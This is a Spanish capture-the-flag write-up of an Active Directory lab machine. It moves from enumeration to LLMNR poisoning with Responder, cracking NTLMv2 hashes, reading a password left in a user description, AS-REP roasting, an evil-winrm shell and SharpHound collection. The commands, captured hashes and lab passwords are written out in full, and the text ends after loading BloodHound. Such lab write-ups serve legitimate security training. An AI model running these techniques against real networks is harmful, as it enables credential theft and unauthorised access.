---
description: >-
  Writeup de la máquina de dificultad media Curiosity de la página https://thehackerslabs.com
title: THL - Curiosity | (Difficulty Medium) - Windows
date: 2025-02-11
categories: [Writeup, The Hackers Labs]
tags: [thl, hacking, the hacker labs, active directory, medium, writeup, redteam, pentesting]
image_post: true
image: https://github.com/user-attachments/assets/314a021e-123d-4111-ae5c-49c9197ee0c1
---

## Useful Skills

* DNS Enumeration
* RCP Enumeration
* SMB Enumeration
* LLMNR Poisoning
* Cracking hashes
* Information Lekeage
* AS-REP Roasting
* BloodHound analysis

## Enumeration

### TCP Scan

```bash
rustscan -a 192.168.1.138 --ulimit 5000 -g
192.168.1.138 -> [53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49680,49681,49687,49690,49703,49713]
```

```bash
nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49680,49681,49687,49690,49703,49713 -sCV 192.168.1.138 -oN tcpScan
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-11 15:11 CET
Nmap scan report for 192.168.1.138 (192.168.1.138)
Host is up (0.00014s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-02-11 14:11:07Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: hackme.thl, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.hackme.thl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.hackme.thl
| Not valid before: 2024-10-16T13:11:58
|_Not valid after:  2025-10-16T13:11:58
|_ssl-date: 2025-02-11T14:12:10+00:00; 0s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: hackme.thl, Site: Default-First-Site-Name)
|_ssl-date: 2025-02-11T14:12:10+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=DC.hackme.thl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.hackme.thl
| Not valid before: 2024-10-16T13:11:58
|_Not valid after:  2025-10-16T13:11:58
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: hackme.thl, Site: Default-First-Site-Name)
|_ssl-date: 2025-02-11T14:12:10+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=DC.hackme.thl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.hackme.thl
| Not valid before: 2024-10-16T13:11:58
|_Not valid after:  2025-10-16T13:11:58
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: hackme.thl, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.hackme.thl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.hackme.thl
| Not valid before: 2024-10-16T13:11:58
|_Not valid after:  2025-10-16T13:11:58
|_ssl-date: 2025-02-11T14:12:10+00:00; 0s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49680/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49681/tcp open  msrpc         Microsoft Windows RPC
49687/tcp open  msrpc         Microsoft Windows RPC
49690/tcp open  msrpc         Microsoft Windows RPC
49703/tcp open  msrpc         Microsoft Windows RPC
49713/tcp open  msrpc         Microsoft Windows RPC
MAC Address: 08:00:27:7F:C9:C3 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: DC, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:7f:c9:c3 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
| smb2-time: 
|   date: 2025-02-11T14:12:01
|_  start_date: 2025-02-11T13:03:29
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 68.60 seconds
```

### UDP Scan

```bash
nmap -sU --top-ports 1500 --min-rate 5000 -n -Pn 192.168.1.138 -oN udpScan
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-11 15:12 CET
Nmap scan report for 192.168.1.138
Host is up (0.00082s latency).
Not shown: 1494 open|filtered udp ports (no-response)
PORT      STATE  SERVICE
53/udp    open   domain
88/udp    open   kerberos-sec
123/udp   open   ntp
137/udp   open   netbios-ns
389/udp   open   ldap
31352/udp closed unknown
MAC Address: 08:00:27:7F:C9:C3 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 0.94 seconds
```
> Hay que añadir el dominio hackme.thl y el FQDN DC.hackme.thl en el archivo de configuración /etc/hosts para que se pueda resolver el nombre de dominio a la dirección IP 192.168.1.138
{: .prompt-tip }

### DNS Enumeration

Intento obtener información adicional sobre el dominio a través de consultas DNS con dig, donde intento obtener los registros NS, MX, CNAME entre otros, posteriormente, trato de realizar una transferencia de zona, pero esta resulta fallida.

```bash
dig hackme.thl@192.168.1.138 axfr

; <<>> DiG 9.20.4-4-Debian <<>> hackme.thl@192.168.1.138 axfr
;; global options: +cmd
; Transfer failed.
```

### RPC Enumeration

Utilizo un null session para intentar enumerar información de todo los usuarios a través de RPC, pero el null session no se encuentra habilitado

```bash
rpcclient 192.168.1.138 -U "" -N -c enumdomusers
result was NT_STATUS_ACCESS_DENIED`bash
```

### SMB Enumeration

Utilizo NetExec para realizar un escaneo de SMB y obtener información clave como el sistema operativo, nombre del servidor, dominio, si la firma smb está habilita y si la versión antigua SMBv1 está activada o desactivada.

```bash
nxc smb 192.168.1.138
SMB  192.168.1.138  445  DC  [*] Windows  10 / Server 2016 Build 14393 x64  (name:DC) (domain:hackme.thl) (signing:True) (SMBv1:False)
```

Utilizo NetExec para enumerar los recursos compartidos del sistema a través del protocolo SMB con autenticación nula, pero no es posible

```bash
nxc smb 192.168.1.138 -u ' ' -p '' --shares
SMB  192.168.1.138  445  DC  [*] Windows 10 / Server 2016 Build 14393 x64 (name:DC) (domain:hackme.thl) (signing:True) (SMBv1:False)
SMB  192.168.1.138  445  DC  [-] hackme.thl\ : STATUS_LOGON_FAILURE 
```
## Exploitation

### LLMNR Poisoning

Ejecuto la herramienta responder y la dejo en segundo plano, para así intentar capturar hashes NTLMv2 de usuarios autenticados en la red. Si algún usuario del dominio intenta acceder a un recurso de red (SMB, Servidor, Web, etc...) y por alguna razón el recurso no existe Windows intenta resolver el nombre usando LLMNR o NetBIOS, lo que desembocará en que Windows envíe las credenciales del usuario en forma de hash NTLMv2 a mi recurso falso.

```bash
python3 Responder.py -I eth0 -wd
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.5.0

[+] Listening for events...

[*] [DHCP] Found DHCP server IP: 192.168.1.1, now waiting for incoming requests...
[*] [NBT-NS] Poisoned answer sent to 192.168.1.138 for name SQLSERVER (service: File Server)
[*] [LLMNR]  Poisoned answer sent to fe80::74e2:7d8f:9f17:89fc for name SQLserver
[*] [LLMNR]  Poisoned answer sent to 192.168.56.8 for name SQLserver
[*] [LLMNR]  Poisoned answer sent to fe80::74e2:7d8f:9f17:89fc for name SQLserver
[*] [LLMNR]  Poisoned answer sent to 192.168.56.8 for name SQLserver
[*] [LLMNR]  Poisoned answer sent to fe80::9848:a4af:2563:6e54 for name SQLserver
[*] [LLMNR]  Poisoned answer sent to 192.168.1.138 for name SQLserver
[*] [LLMNR]  Poisoned answer sent to fe80::9848:a4af:2563:6e54 for name SQLserver
[*] [LLMNR]  Poisoned answer sent to 192.168.1.138 for name SQLserver
[SMB] NTLMv2-SSP Client   : fe80::74e2:7d8f:9f17:89fc
[SMB] NTLMv2-SSP Username : hackme\jdoe
[SMB] NTLMv2-SSP Hash     : jdoe::hackme:faa58de1eb3d1697:AAB3D6BA09ABCC85ED1F843AF879EBE3:0101000000000000000855D3987CDB0167B939FA04E68AAD0000000002000800540032003500390001001E00570049004E002D0030003800300032004700460030004F005A005700520004003400570049004E002D0030003800300032004700460030004F005A00570052002E0054003200350039002E004C004F00430041004C000300140054003200350039002E004C004F00430041004C000500140054003200350039002E004C004F00430041004C0007000800000855D3987CDB01060004000200000008003000300000000000000000000000004000001AD337D04DF3A7641AB484A3BE312D3DF4FB5C6AB976C6A49E2347AC10EBE5740A0010000000000000000000000000000000000009001C0063006900660073002F00530051004C00730065007200760065007200000000000000000000000000
```

Tras un rato de espera consigo obtener una hash NTLMv2, el cual consigo crackear de forma offline con hashcat, como no conseguía encontrar la contraseña utilice un bucle for que iterase sobre todos los diccionarios de la categoría Passwords de seclists, consiguiendo así crackear la contraseña, la cual es '$pr1ng@'

```bash
for dict in /usr/share/seclists/Passwords/*.txt; do john --wordlist=$dict hash;done
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 32 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
$pr1ng@          (jdoe)
0g 0:00:00:00 DONE (2025-02-11 16:10) 0g/s 100.0p/s 100.0c/s 100.0C/s Mb2.r5oHf-0t
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```

### Information Lekeage (rpcclient)

Utilizo el usuario jdoe y la contraseña '$pr1ng@' para enumerar información de todo los usuarios a través de RPC, consiguiendo obtener en la descripción del usuario osama lo que parece ser una contraseñ

```bash
rpcclient 192.168.1.138 -U hackme.thl/jdoe%'$pr1ng@' -c querydispinfo
index: 0x10d5 RID: 0x459 acb: 0x00000210 Account: aaren	Name: (null)	Desc: (null)
index: 0xfbc RID: 0x1f4 acb: 0x00000210 Account: Administrator	Name: (null)	Desc: Built-in account for administering the computer/domain
index: 0x10db RID: 0x45f acb: 0x00000210 Account: ahamil	Name: (null)	Desc: (null)
index: 0x10d8 RID: 0x45c acb: 0x00010210 Account: appolonia	Name: (null)	Desc: (null)
index: 0x10d7 RID: 0x45b acb: 0x00000210 Account: bwats	Name: (null)	Desc: (null)
index: 0x10d3 RID: 0x458 acb: 0x00000210 Account: dba_adm	Name: dba_adm	Desc: (null)
index: 0xfbe RID: 0x1f7 acb: 0x00000215 Account: DefaultAccount	Name: (null)	Desc: A user account managed by the system.
index: 0xfbd RID: 0x1f5 acb: 0x00000215 Account: Guest	Name: (null)	Desc: Built-in account for guest access to the computer/domain
index: 0x10d6 RID: 0x45a acb: 0x00000210 Account: jdoe	Name: (null)	Desc: (null)
index: 0xff4 RID: 0x1f6 acb: 0x00020011 Account: krbtgt	Name: (null)	Desc: Key Distribution Center Service Account
index: 0x10da RID: 0x45e acb: 0x00000210 Account: mvazquez	Name: (null)	Desc: (null)
index: 0x10dc RID: 0x460 acb: 0x00000210 Account: osama	Name: (null)	Desc: n()tDH[ow8p7
index: 0x10d9 RID: 0x45d acb: 0x00020010 Account: rsifrey	Name: (null)	Desc: (null)
index: 0x1092 RID: 0x452 acb: 0x00000210 Account: sqlsvc	Name: sqlsvc	Desc: (null)
index: 0x10dd RID: 0x461 acb: 0x00010210 Account: yogesh	Name: (null)	Desc: (null)
```

Utilizo NetExec para validar el usuario osama y la contraseña 'n()tDH[ow8p7', observo que es correcta, por lo que se trata de una fuga de información

```bash
nxc smb 192.168.1.138 -u 'osama' -p 'n()tDH[ow8p7'
SMB  192.168.1.138  445  DC  [*] Windows 10 / Server 2016 Build 14393 x64 (name:DC) (domain:hackme.thl) (signing:True) (SMBv1:False)
SMB  192.168.1.138  445  DC  [+] hackme.thl\osama:n()tDH[ow8p7 
```

### AS-REP Roasting

Utilizo rpcclient para obtener una lista potencial de usuarios, la cual utilizo para comprobar si alguno de ellos tiene la autenticación previa de kerberos deshabilitada, consigo obtener dos hashes, uno del usuario appolonia y otro del usuario yogesh, pero no soy capaz de crackearlos

```bash
rpcclient 192.168.1.138 -U hackme.thl/jdoe%'$pr1ng@' -c enumdomusers | grep -oP '\[.*?\]' | grep -v 0x | tr -d [] > users.txt
```

```bash
impacket-GetNPUsers -no-pass -usersfile users.txt hackme.thl/
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User sqlsvc doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User dba_adm doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User aaren doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User jdoe doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User bwats doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$appolonia@HACKME.THL:02f83e96ab7582a96b4141a225484b6b$5e36df04881cb509465969c4bde0242c55454b2c8b90d868f069d2ea810a6acca06899801c20dc35ce687c2911ed10f58c82613b742798debd92b6bc66bf0da11549a0389b732d79f58c51d625de5e56a1337a9d1b43b71e656dd6b58e692f9c95fcd62edcd82a01e0bab14a30778800879ca9e4c87ac462b4e576adc94efe336d2e5f2d8f9121eb4229a5f7f390b08aa2532ea2f0e13d627ed68542a48958d36ba45d6e920bdd126a9a814d1675c13af3d28b28e54bbbd748a65fa978b17a4113952ea3da9e4a2032850510e8147f8909047ef99bde089afba26d093b389bcdb79ad17604e56a69
[-] User rsifrey doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mvazquez doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ahamil doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User osama doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$yogesh@HACKME.THL:d201c9be847bcbef458639d33f1e28c1$0b2d593a12c40d49352a66586e96413d522f1d2785f4ea0c95cea72a5ddbfd1488fd6ad8688739299bcffcf1416a220c71719046a042f9142626a7c5fba9bd34b729267fe56491f37d5f42d58255ac22d4c3111812db0c3880fe794fede771d5a0329a4d547bb0009809ddeb1b429f238701d60f27eeacb6f6a52ae03b8d0b2d65f11557854dbea0052ef7d2bc1a955d29a64c41fd7f6ef364dc4867e5855cc461ae5bd4a7a779dcf444f9ac8243e87a52cdeff45b9e94156cf6fc8de69aae36304a3ba7dd5504baf052b36939b71b88cd07fbf44d2eb1a4ce8e618886a7f3378640122cd5c99b7e
```

## Gain access

Verifico con NetExec si puedo acceder al sistema mediante el servicio WinRM con algunos de los usuarios obtenidos hasta ahora. Obtengo un (Pwned!) con el usuario jdoe lo que indica que las credenciales proporcionadas son válidas para autenticarse con WinRM

```bash
nxc winrm 192.168.1.138 -u users.txt -p passwords.txt
WINRM  192.168.1.138  5985  DC  [*] Windows 10 / Server 2016 Build 14393 (name:DC) (domain:hackme.thl)
WINRM  192.168.1.138  5985  DC  [+] hackme.thl\jdoe:$pr1ng@ (Pwn3d!)
WINRM  192.168.1.138  5985  DC  [-] hackme.thl\osama:$pr1ng@
WINRM  192.168.1.138  5985  DC  [-] hackme.thl\osama:n()tDH[ow8p7
```

Accedo al sistema con evil-winrm como el usuario jdoe

```bash
evil-winrm -i 192.168.1.138 -u jdoe -p '$pr1ng@'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\jdoe\Documents> whoami
hackme\jdoe
```

## Post exploitation

### User Pivoting

Utilizo BloodHound para identificar puntos débiles en la configuración de Active Directory que me puedan permitir escalar mis privilegios

```bash
*Evil-WinRM* PS C:\Users\jdoe\Documents\BloodHound> upload SharpHound.exe
                                        
Info: Uploading /home/ju4ncaa/Documentos/Hacking/Curiosity/content/SharpHound.exe to C:\Users\jdoe\Documents\BloodHound\SharpHound.exe
                                        
Data: 2075988 bytes of 2075988 bytes copied
                                        
Info: Upload successful!
```

Subo SharpHound a través de evil-winrm para recopila datos del controlador de dominio

```bash
*Evil-WinRM* PS C:\Users\jdoe\Documents\BloodHound> .\SharpHound.exe -c All
2025-02-11T17:24:30.1528866+01:00|INFORMATION|This version of SharpHound is compatible with the 5.0.0 Release of BloodHound
2025-02-11T17:24:30.2311957+01:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote, UserRights, CARegistry, DCRegistry, CertServices
2025-02-11T17:24:30.2468275+01:00|INFORMATION|Initializing SharpHound at 17:24 on 11/02/2025
2025-02-11T17:24:30.2624475+01:00|INFORMATION|Resolved current domain to hackme.thl
2025-02-11T17:24:30.3253161+01:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote, UserRights, CARegistry, DCRegistry, CertServices
2025-02-11T17:24:30.3715206+01:00|INFORMATION|Beginning LDAP search for hackme.thl
2025-02-11T17:24:30.4028314+01:00|INFORMATION|Beginning LDAP search for hackme.thl Configuration NC
2025-02-11T17:24:30.4184629+01:00|INFORMATION|Producer has finished, closing LDAP channel
2025-02-11T17:24:30.4184629+01:00|INFORMATION|LDAP channel closed, waiting for consumers
2025-02-11T17:24:30.4655223+01:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for HACKME.THL
2025-02-11T17:24:30.5593936+01:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for HACKME.THL
2025-02-11T17:24:30.7627079+01:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for HACKME.THL
2025-02-11T17:24:30.8401638+01:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for HACKME.THL
2025-02-11T17:24:31.1687870+01:00|INFORMATION|Consumers finished, closing output channel
2025-02-11T17:24:31.1844173+01:00|INFORMATION|Output channel closed, waiting for output task to complete
Closing writers
2025-02-11T17:24:31.3252071+01:00|INFORMATION|Status: 373 objects finished (+373 Infinity)/s -- Using 39 MB RAM
2025-02-11T17:24:31.3252071+01:00|INFORMATION|Enumeration finished in 00:00:00.9608488
2025-02-11T17:24:31.3721048+01:00|INFORMATION|Saving cache with stats: 23 ID to type mappings.
 1 name to SID mappings.
 1 machine sid mappings.
 4 sid to domain mappings.
 0 global catalog mappings.
2025-02-11T17:24:31.3877869+01:00|INFORMATION|SharpHound Enumeration Completed at 17:24 on 11/02/2025! Happy Graphing!
```

Una vez ejecutado se crean dos archivos un .bin y .zip, el archivo .zip es el que hay cargar en BloodHound por lo que lo descargo con evil-winrm

```bash
*Evil-WinRM* PS C:\Users\jdoe\Documents\BloodHound> dir

    Directory: C:\Users\jdoe\Documents\BloodHound

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        2/11/2025   5:24 PM          36778 20250211172430_BloodHound.zip
-a----        2/11/2025   5:24 PM           1852 MGVmMzZlNzEtOGNkZi00M
```

```bash
*Evil-WinRM* PS C:\Users\jdoe\Documents\BloodHound> download 20250211172430_BloodHound.zip
                                        
Info: Downloading C:\Users\jdoe\Documents\BloodHound\20250211172430_BloodHound.zip to 20250211172430_BloodHound.zip
                                        
Info: Download successful!
```

Una vez descargado el .zip inicio neo4j y cargo el archivo en BloodHound

```bash
neo4j console
Directories in use:
home:         /usr/share/neo4j
config:       /usr/share/neo4j/conf
logs:         /etc/neo4j/logs
plugins:      /usr/share/neo4j/plugins
import:       /usr/share/neo4j/import
data:         /etc/neo4j/data
certificates: /usr/share/neo4j/certificates
licenses:     /usr/share/neo4j/licenses
run:          /var/lib/neo4j/run
Starting Neo4j.
2025-02-11 16:30:23.245+0000 INFO  Starting...
2025-02-11 16:30:23.439+0000 INFO  This instance is ServerId{489d6a72} (489d6a72-6029-479a-89d6-e4a21e9ebc70)
2025-02-11 16:30:24.019+0000 INFO  ======== Neo4j 4.4.26 ========
2025-02-11 16:30:24.584+0000 INFO  Performing postInitialization step for component 'security-users' with version 3 and status CURRENT
2025-02-11 16:30:24.584+0000 INFO  Updating the initial password in component 'security-users'
2025-02-11 16:30:24.662+0000 INFO  Bolt enabled on localhost:7687.
2025-02-11 16:30:25.053+0000 INFO  Remote interface available at http://localhost:7474/
2025-02-11 16:30:25.055+0000 INFO  id: A59061A79F1A9CB3877073C6E5598848BA9042EEDC862DCD1F077E623A63341F
2025-02-11 16:30:25.055+0000 INFO  name: system
2025-02-11 16:30:25.056+0000 INFO  creationDate: 2025-02-11T16:29:11.83Z
2025-02-11 16:30:25.056+0000 INFO  Started.
```

![image](https://github.com/user-attachments/assets/ca0caf94-0399-4950-8fae-71c05d8a3b49)
